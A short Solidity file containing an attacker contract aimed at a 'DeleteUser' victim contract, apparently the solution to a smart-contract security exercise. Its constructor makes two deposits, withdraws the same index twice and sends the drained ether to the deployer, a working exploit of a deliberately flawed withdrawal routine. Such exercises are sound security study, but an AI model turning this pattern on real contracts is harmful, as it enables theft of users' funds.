// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DeleteUser.sol";

contract DeleterUserAttacker {
    constructor(DeleteUser victimContract) payable {
        victimContract.deposit{value: 1 ether}();
        victimContract.deposit();
        victimContract.withdraw(1);
        victimContract.withdraw(1);
        msg.sender.call{value: 1 ether}("");
    }
}